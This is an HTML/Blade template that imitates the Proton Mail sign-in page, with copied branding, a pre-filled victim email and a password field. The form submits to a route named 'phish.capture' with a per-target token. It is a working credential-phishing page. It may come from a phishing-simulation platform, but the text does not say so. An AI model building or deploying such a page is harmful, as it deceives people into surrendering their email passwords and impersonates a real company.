<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Proton Mail Login</title>
    <link rel="icon" href="https://proton.me/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"InterVariable","Inter",system-ui,-apple-system,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;padding:40px 36px;width:100%;max-width:400px;text-align:center}
        .logo{margin-bottom:24px}
        .logo svg{height:28px;width:auto}
        h1{font-size:22px;color:#1a1a2e;font-weight:600;margin-bottom:8px}
        .sub{font-size:14px;color:#666;margin-bottom:28px;line-height:1.4}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;border:1px solid #e0e0e0;border-radius:8px;margin-bottom:20px;gap:12px;text-align:left}
        .avatar{width:32px;height:32px;border-radius:50%;background:#6d4aff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
        .email-text{font-size:14px;color:#333;font-weight:500}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;font-family:"InterVariable","Inter",sans-serif;color:#1a1a2e;background:#f5f5f5;border:1px solid #e0e0e0;border-radius:8px;outline:none;transition:border-color .15s}
        .form-group input:focus{border-color:#6d4aff;box-shadow:0 0 0 3px rgba(109,74,255,.08)}
        .btn-login{width:100%;height:44px;background:#6d4aff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px}
        .btn-login:hover{background:#5a3ae0}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#6d4aff;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{margin-top:32px;font-size:11px;color:#999}
        .footer a{color:#999;text-decoration:none;margin:0 6px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:28px 20px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 140 28" xmlns="http://www.w3.org/2000/svg">
                <path d="M16 0L0 10l8 4v14l8-6V0z" fill="#6d4aff"/>
                <path d="M24 0L8 10l8 4v14l8-6V0z" fill="#6d4aff" opacity=".6"/>
                <text x="38" y="20" font-family="Inter,sans-serif" font-size="20" font-weight="700" fill="#1a1a2e">Proton</text>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="sub">Continue to Proton Mail</p>

        <div class="email-display">
            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="email-text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'protonmail', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>
            <button type="submit" class="btn-login">Sign in</button>
        </form>

        <div class="links-row">
            <a href="#">Forgot password?</a>
            <a href="#">Create an account</a>
        </div>
        <div class="footer">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Copyright © 2026 Proton AG</a>
        </div>
    </div>
</body>
</html>
